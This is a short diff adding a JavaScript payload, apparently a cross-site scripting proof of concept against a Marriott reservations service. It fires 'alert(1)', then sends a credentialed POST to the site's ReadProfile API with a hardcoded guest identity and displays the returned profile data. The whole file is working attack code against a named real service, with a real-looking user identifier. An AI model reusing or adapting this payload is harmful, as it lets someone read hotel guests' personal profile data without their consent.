@@ -1,0 +1,2 @@
+alert(1);
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('POST','https://reservations.all-inclusive.marriott.com/gw/profile/v3/ReadProfile',true); req.setRequestHeader("Content-Type", "application\/json"); req.withCredentials = true; req.send('{"Chain":{"ID":"26025"},"Hotel":{"ID":"9891"},"ResponsePreferences":{"Language":{"code":"en-US"}},"version":3,"profile":{"type":"Guest","Identity":{"ID":"54ee1d49-489c-4f3b-a666-bb9e5be04bf1"}}}'); function reqListener() { alert(this.responseText); };
